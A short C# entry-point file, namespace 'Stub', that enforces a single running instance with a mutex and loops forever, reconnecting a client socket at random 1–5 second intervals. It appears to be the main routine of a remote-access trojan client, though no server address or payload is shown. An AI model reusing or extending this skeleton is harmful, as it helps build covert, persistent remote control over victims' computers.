using System;
using System.Threading;

namespace Stub;

public class Main
{
	[STAThread]
	public static void Main()
	{
		Thread.Sleep(1000);
		if (!Helper.CreateMutex())
		{
			Environment.Exit(0);
		}
		Thread thread = new Thread((ThreadStart)delegate
		{
			while (true)
			{
				Thread.Sleep(new Random().Next(1000, 5000));
				if (!ClientSocket.isConnected)
				{
					ClientSocket.isDisconnected();
					ClientSocket.BeginConnect();
				}
				ClientSocket.allDone.WaitOne();
			}
		});
		thread.Start();
		thread.Join();
	}
}
